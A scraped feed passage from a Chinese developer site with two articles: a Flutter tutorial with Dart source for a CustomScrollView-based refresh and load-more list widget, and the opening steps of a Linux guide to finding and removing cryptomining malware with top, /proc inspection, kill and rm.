            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3544481219481374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    SoaringHeart
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:07:05.000Z" title="Fri Jan 30 2026 13:07:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、需求来源</h2>
<p>最近需要实现嵌套和吸顶Header滚动下的下拉刷新及上拉加载。最终实现基于 CustomScrollView 的刷新视图组件。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3e9bb9de9014aa08abd3f7af32ccb9e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgU29hcmluZ0hlYXJ0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770383372&amp;x-signature=XdLbIzqDsnlJrKiWsZpBPLZQHrE%3D" alt="simulator_screenshot_5C4883E4-F919-4FFD-BE3D-97E0BCD5C40D.png" loading="lazy"/></p>
<h2 data-id="heading-1">二、使用示例</h2>
<pre><code class="hljs language-dart" lang="dart">Widget buildBodyNew() {
  <span class="hljs-keyword">return</span> NCustomScrollView&lt;<span class="hljs-built_in">String</span>&gt;(
    onRequest: (<span class="hljs-built_in">bool</span> isRefresh, <span class="hljs-built_in">int</span> page, <span class="hljs-built_in">int</span> pageSize, pres) <span class="hljs-keyword">async</span> {
      <span class="hljs-keyword">final</span> length = isRefresh ? <span class="hljs-number">0</span> : pres.length;
      <span class="hljs-keyword">final</span> list = <span class="hljs-built_in">List</span>&lt;<span class="hljs-built_in">String</span>&gt;.generate(pageSize, (i) =&gt; <span class="hljs-string">"item<span class="hljs-subst">${length + i}</span>"</span>);
      DLog.d([isRefresh, list.length]);
      <span class="hljs-keyword">return</span> list;
    },
    headerSliverBuilder: (context, <span class="hljs-built_in">bool</span> innerBoxIsScrolled) {
      <span class="hljs-keyword">return</span> [
        buildPersistentHeader(),
      ];
    },
    itemBuilder: (_, i, e) {
      <span class="hljs-keyword">return</span> ListTile(
        title: Text(<span class="hljs-string">'Item <span class="hljs-subst">$i</span>'</span>),
      );
    },
  );
}
</code></pre>
<h2 data-id="heading-2">三、源码</h2>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-comment">//</span>
<span class="hljs-comment">//  NCustomScrollView.dart</span>
<span class="hljs-comment">//  projects</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">//  Created by shang on 2026/1/28 14:41.</span>
<span class="hljs-comment">//  Copyright © 2026/1/28 shang. All rights reserved.</span>
<span class="hljs-comment">//</span>

<span class="hljs-keyword">import</span> <span class="hljs-string">'package:easy_refresh/easy_refresh.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter/material.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter_templet_project/basicWidget/n_placeholder.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter_templet_project/basicWidget/n_sliver_decorated.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter_templet_project/basicWidget/refresh/easy_refresh_mixin.dart'</span>;
<span class="hljs-keyword">import</span> <span class="hljs-string">'package:flutter_templet_project/basicWidget/refresh/n_refresh_view.dart'</span>;

<span class="hljs-comment">/// <span class="markdown">基于 CustomScrollView 的下拉刷新,上拉加载更多的滚动列表</span></span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">NCustomScrollView</span>&lt;<span class="hljs-title">T</span>&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title">StatefulWidget</span> </span>{
  <span class="hljs-keyword">const</span> NCustomScrollView({
    <span class="hljs-keyword">super</span>.key,
    <span class="hljs-keyword">this</span>.title,
    <span class="hljs-keyword">this</span>.placeholder = <span class="hljs-keyword">const</span> NPlaceholder(),
    <span class="hljs-keyword">this</span>.contentDecoration = <span class="hljs-keyword">const</span> BoxDecoration(),
    <span class="hljs-keyword">this</span>.contentPadding = <span class="hljs-keyword">const</span> EdgeInsets.all(<span class="hljs-number">0</span>),
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.onRequest,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.headerSliverBuilder,
    <span class="hljs-keyword">required</span> <span class="hljs-keyword">this</span>.itemBuilder,
    <span class="hljs-keyword">this</span>.separatorBuilder,
    <span class="hljs-keyword">this</span>.headerBuilder,
    <span class="hljs-keyword">this</span>.footerBuilder,
    <span class="hljs-keyword">this</span>.builder,
  });

  <span class="hljs-keyword">final</span> <span class="hljs-built_in">String?</span> title;

  <span class="hljs-keyword">final</span> Widget? placeholder;

  <span class="hljs-keyword">final</span> Decoration contentDecoration;

  <span class="hljs-keyword">final</span> EdgeInsets contentPadding;

  <span class="hljs-comment">/// <span class="markdown">请求方法</span></span>
  <span class="hljs-keyword">final</span> RequestListCallback&lt;T&gt; onRequest;

  <span class="hljs-comment">/// <span class="markdown">列表表头</span></span>
  <span class="hljs-keyword">final</span> NestedScrollViewHeaderSliversBuilder? headerSliverBuilder;

  <span class="hljs-comment">/// <span class="markdown">ListView 的 itemBuilder</span></span>
  <span class="hljs-keyword">final</span> ValueIndexedWidgetBuilder&lt;T&gt; itemBuilder;

  <span class="hljs-keyword">final</span> IndexedWidgetBuilder? separatorBuilder;

  <span class="hljs-comment">/// <span class="markdown">列表表头</span></span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;Widget&gt; <span class="hljs-built_in">Function</span>(<span class="hljs-built_in">int</span> count)? headerBuilder;

  <span class="hljs-comment">/// <span class="markdown">列表表尾</span></span>
  <span class="hljs-keyword">final</span> <span class="hljs-built_in">List</span>&lt;Widget&gt; <span class="hljs-built_in">Function</span>(<span class="hljs-built_in">int</span> count)? footerBuilder;

  <span class="hljs-keyword">final</span> Widget <span class="hljs-built_in">Function</span>(<span class="hljs-built_in">List</span>&lt;T&gt; items)? builder;

  <span class="hljs-meta">@override</span>
  State&lt;NCustomScrollView&lt;T&gt;&gt; createState() =&gt; _NCustomScrollViewState&lt;T&gt;();
}

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">_NCustomScrollViewState</span>&lt;<span class="hljs-title">T</span>&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title">State</span>&lt;<span class="hljs-title">NCustomScrollView</span>&lt;<span class="hljs-title">T</span>&gt;&gt;
    <span class="hljs-title">with</span> <span class="hljs-title">AutomaticKeepAliveClientMixin</span>, <span class="hljs-title">EasyRefreshMixin</span>&lt;<span class="hljs-title">NCustomScrollView</span>&lt;<span class="hljs-title">T</span>&gt;, <span class="hljs-title">T</span>&gt; </span>{
  <span class="hljs-meta">@override</span>
  <span class="hljs-built_in">bool</span> <span class="hljs-keyword">get</span> wantKeepAlive =&gt; <span class="hljs-keyword">true</span>;

  <span class="hljs-keyword">final</span> scrollController = ScrollController();

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">late</span> RequestListCallback&lt;T&gt; onRequest = widget.onRequest;

  <span class="hljs-meta">@override</span>
  <span class="hljs-built_in">List</span>&lt;T&gt; items = &lt;T&gt;[];

  <span class="hljs-meta">@override</span>
  <span class="hljs-keyword">void</span> didUpdateWidget(<span class="hljs-keyword">covariant</span> NCustomScrollView&lt;T&gt; oldWidget) {
    <span class="hljs-keyword">super</span>.didUpdateWidget(oldWidget);
    <span class="hljs-keyword">if</span> (widget.title != oldWidget.title ||
        widget.placeholder != oldWidget.placeholder ||
        widget.contentDecoration != oldWidget.contentDecoration ||
        widget.contentPadding != oldWidget.contentPadding ||
        widget.onRequest != oldWidget.onRequest ||
        widget.itemBuilder != oldWidget.itemBuilder ||
        widget.separatorBuilder != oldWidget.separatorBuilder) {
      setState(() {});
    }
  }

  <span class="hljs-meta">@override</span>
  Widget build(BuildContext context) {
    <span class="hljs-keyword">super</span>.build(context);
    <span class="hljs-keyword">if</span> (items.isEmpty) {
      <span class="hljs-keyword">return</span> GestureDetector(onTap: onRefresh, child: Center(child: widget.placeholder));
    }

    <span class="hljs-keyword">final</span> child = EasyRefresh.builder(
      controller: refreshController,
      onRefresh: onRefresh,
      onLoad: onLoad,
      childBuilder: (_, physics) {
        <span class="hljs-keyword">return</span> CustomScrollView(
          physics: physics,
          slivers: [
            ...(widget.headerBuilder?.call(items.length) ?? []),
            buildContent(),
            ...(widget.footerBuilder?.call(items.length) ?? []),
          ],
        );
      },
    );
    <span class="hljs-keyword">if</span> (widget.headerSliverBuilder == <span class="hljs-keyword">null</span>) {
      <span class="hljs-keyword">return</span> child;
    }

    <span class="hljs-keyword">return</span> NestedScrollView(
      headerSliverBuilder: widget.headerSliverBuilder!,
      body: child,
    );
  }

  Widget buildContent() {
    <span class="hljs-keyword">if</span> (items.isEmpty) {
      <span class="hljs-keyword">return</span> SliverToBoxAdapter(child: widget.placeholder);
    }

    <span class="hljs-keyword">return</span> NSliverDecorated(
      decoration: widget.contentDecoration,
      sliver: SliverPadding(
        padding: widget.contentPadding,
        sliver: widget.builder?.call(items) ?? buildSliverList(),
      ),
    );
  }

  Widget buildSliverList() {
    <span class="hljs-keyword">return</span> SliverList.separated(
      itemBuilder: (_, i) =&gt; widget.itemBuilder(context, i, items[i]),
      separatorBuilder: (_, i) =&gt; widget.separatorBuilder?.call(context, i) ?? <span class="hljs-keyword">const</span> SizedBox(),
      itemCount: items.length,
    );
  }
}
</code></pre>
<p>源码：EasyRefreshMixin.dart</p>
<pre><code class="hljs language-ini" lang="ini">//
//  EasyRefreshMixin.dart
//  projects
//
//  Created by shang on 2026/1/28 14:37.
//  Copyright © 2026/1/28 shang. All rights reserved.
//

import 'package:easy_refresh/easy_refresh.dart'<span class="hljs-comment">;</span>
import 'package:flutter/material.dart'<span class="hljs-comment">;</span>
import 'package:flutter_templet_project/basicWidget/refresh/n_refresh_view.dart'<span class="hljs-comment">;</span>

/// EasyRefresh刷新 mixin
mixin EasyRefreshMixin&lt;W extends StatefulWidget, T&gt; on State&lt;W&gt; {
  late final <span class="hljs-attr">refreshController</span> = EasyRefreshController(
    controlFinishRefresh: true,
    controlFinishLoad: true,
  )<span class="hljs-comment">;</span>


  /// 请求方式
  late RequestListCallback&lt;T&gt; _onRequest<span class="hljs-comment">;</span>
  RequestListCallback&lt;T&gt; get <span class="hljs-attr">onRequest</span> =&gt; _onRequest<span class="hljs-comment">;</span>
  set onRequest(RequestListCallback&lt;T&gt; value) {
    <span class="hljs-attr">_onRequest</span> = value<span class="hljs-comment">;</span>
  }

  // 数据列表
  List&lt;T&gt; <span class="hljs-attr">_items</span> = []<span class="hljs-comment">;</span>
  List&lt;T&gt; get <span class="hljs-attr">items</span> =&gt; _items<span class="hljs-comment">;</span>
  set items(List&lt;T&gt; value) {
    <span class="hljs-attr">_items</span> = value<span class="hljs-comment">;</span>
  }

  int <span class="hljs-attr">page</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
  final int <span class="hljs-attr">pageSize</span> = <span class="hljs-number">20</span><span class="hljs-comment">;</span>
  var <span class="hljs-attr">indicator</span> = IndicatorResult.success<span class="hljs-comment">;</span>

  @override
  void dispose() {
    refreshController.dispose()<span class="hljs-comment">;</span>
    super.dispose()<span class="hljs-comment">;</span>
  }

  @override
  void initState() {
    super.initState()<span class="hljs-comment">;</span>

    WidgetsBinding.instance.addPostFrameCallback((_) {
      // DLog.d(<span class="hljs-section">[widget.title, widget.key, hashCode]</span>)<span class="hljs-comment">;</span>
      if (items.isEmpty) {
        onRefresh()<span class="hljs-comment">;</span>
      }
    })<span class="hljs-comment">;</span>
  }

  Future&lt;void&gt; onRefresh() async {
    try {
      <span class="hljs-attr">page</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
      final <span class="hljs-attr">list</span> = await <span class="hljs-literal">on</span>Request(<span class="hljs-literal">true</span>, page, pageSize, &lt;T&gt;[])<span class="hljs-comment">;</span>
      items.replaceRange(0, items.length, list)<span class="hljs-comment">;</span>
      page++<span class="hljs-comment">;</span>

      final <span class="hljs-attr">noMore</span> = list.length &lt; pageSize<span class="hljs-comment">;</span>
      if (noMore) {
        <span class="hljs-attr">indicator</span> = IndicatorResult.noMore<span class="hljs-comment">;</span>
      }
      refreshController.finishRefresh()<span class="hljs-comment">;</span>
      refreshController.resetFooter()<span class="hljs-comment">;</span>
    } catch (e) {
      refreshController.finishRefresh(IndicatorResult.fail)<span class="hljs-comment">;</span>
    }
    setState(() {})<span class="hljs-comment">;</span>
  }

  Future&lt;void&gt; onLoad() async {
    if (<span class="hljs-attr">indicator</span> == IndicatorResult.noMore) {
      refreshController.finishLoad()<span class="hljs-comment">;</span>
      return<span class="hljs-comment">;</span>
    }

    try {
      final <span class="hljs-attr">start</span> = (items.length - pageSize).clamp(<span class="hljs-number">0</span>, pageSize)<span class="hljs-comment">;</span>
      final <span class="hljs-attr">prePages</span> = items.sublist(start)<span class="hljs-comment">;</span>
      final <span class="hljs-attr">list</span> = await <span class="hljs-literal">on</span>Request(<span class="hljs-literal">false</span>, page, pageSize, prePages)<span class="hljs-comment">;</span>
      items.addAll(list)<span class="hljs-comment">;</span>
      page++<span class="hljs-comment">;</span>

      final <span class="hljs-attr">noMore</span> = list.length &lt; pageSize<span class="hljs-comment">;</span>
      if (noMore) {
        <span class="hljs-attr">indicator</span> = IndicatorResult.noMore<span class="hljs-comment">;</span>
      }
      refreshController.finishLoad(indicator)<span class="hljs-comment">;</span>
    } catch (e) {
      refreshController.finishLoad(IndicatorResult.fail)<span class="hljs-comment">;</span>
    }
    setState(() {})<span class="hljs-comment">;</span>
  }
}
</code></pre>
<h2 data-id="heading-3">最后、总结</h2>
<p>1、当页面比较复杂，需要吸顶或者嵌套滚动时就必须使用 Sliver 相关组件，否则会有滚动行文冲突。</p>
<p>2、NCustomScrollView 支持顶部吸顶组件自定义；底部列表头，列表尾设置，支持sliver 设置 Decoration。</p>
<p>3、支持下拉刷新，上拉加载更多，代码极简，使用方便。</p>
<p>4、刷新逻辑封装在 EasyRefreshMixin 混入里，方便多组件可共用。</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fshang1219178163%2Fflutter_templet_project%2Fblob%2Fv3.27.0%2Flib%2FbasicWidget%2Frefresh%2Fn_custom_scrollView.dart" target="_blank" title="https://github.com/shang1219178163/flutter_templet_project/blob/v3.27.0/lib/basicWidget/refresh/n_custom_scrollView.dart" ref="nofollow noopener noreferrer">github</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[CPU 飙升是服务器被挖矿病毒攻击怎么办？]]></title>    <link>https://juejin.cn/post/7600955777316028454</link>    <guid>https://juejin.cn/post/7600955777316028454</guid>    <pubDate>2026-01-30T13:21:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600955777316028454" data-draft-id="7600990891218616329" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="CPU 飙升是服务器被挖矿病毒攻击怎么办？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-30T13:21:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="90后晨仔"/> <meta itemprop="url" content="https://juejin.cn/user/2717648476705773"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            CPU 飙升是服务器被挖矿病毒攻击怎么办？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2717648476705773/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    90后晨仔
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T13:21:43.000Z" title="Fri Jan 30 2026 13:21:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>CPU 飙升是服务器被挖矿病毒（如 xmrig、kdevtmpfsi、watchdogs 等）攻击的典型表现。这类恶意程序会利用你的服务器资源进行加密货币挖矿，导致 CPU 持续 100% 占用，系统变慢甚至宕机。</p>
<p>下面是一套<strong>针对性排查与清除方案</strong>，适用于 Linux 系统（如 CentOS、Ubuntu）：</p>
<hr/>
<h3 data-id="heading-0">🔍 第一步：快速定位高 CPU 进程</h3>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash">查看 CPU 占用最高的进程</span>
top
<span class="hljs-meta prompt_">
# </span><span class="bash">按 <span class="hljs-string">'P'</span>（大写）可按 CPU 使用率排序</span>
</code></pre>
<p>重点关注：</p>
<ul>
<li>进程名可疑（如 <code>kdevtmpfsi</code>、<code>xmrig</code>、<code>sysupdate</code>、<code>networkservice</code>、<code>watchdog</code>、随机字符串）</li>
<li>用户不是你创建的（如 <code>nobody</code>、<code>daemon</code>、<code>redis</code> 等系统用户运行未知程序）</li>
</ul>
<p>记下 PID 和进程名。</p>
<hr/>
<h3 data-id="heading-1">🕵️ 第二步：深入分析可疑进程</h3>
<p>假设你发现一个叫 <code>kdevtmpfsi</code> 的进程占用了 95% CPU：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 查看该进程的详细信息（替换为实际 PID）</span>
PID=12345
<span class="hljs-built_in">ls</span> -l /proc/<span class="hljs-variable">$PID</span>/exe          <span class="hljs-comment"># 查看它实际执行的是哪个文件</span>
<span class="hljs-built_in">cat</span> /proc/<span class="hljs-variable">$PID</span>/cmdline        <span class="hljs-comment"># 查看启动命令（可能带矿池地址）</span>
<span class="hljs-built_in">cat</span> /proc/<span class="hljs-variable">$PID</span>/environ | <span class="hljs-built_in">tr</span> <span class="hljs-string">'\0'</span> <span class="hljs-string">'\n'</span>  <span class="hljs-comment"># 查看环境变量</span>
</code></pre>
<p>常见藏匿路径：</p>
<ul>
<li><code>/tmp/</code></li>
<li><code>/dev/shm/</code></li>
<li><code>/var/tmp/</code></li>
<li><code>/usr/bin/.xxx</code>（隐藏文件）</li>
<li><code>/root/.cache/</code></li>
</ul>
<hr/>
<h3 data-id="heading-2">🧹 第三步：终止进程并删除文件</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 终止进程</span>
<span class="hljs-built_in">kill</span> -9 12345

<span class="hljs-comment"># 删除对应文件（根据 /proc/PID/exe 的结果）</span>
<span class="hljs-built_in">rm</span> -f /tmp/kdevtmpfsi
<span class="hljs-built_in">rm</span> -f /dev/shm/kdevtmpfsi
</code></pre>
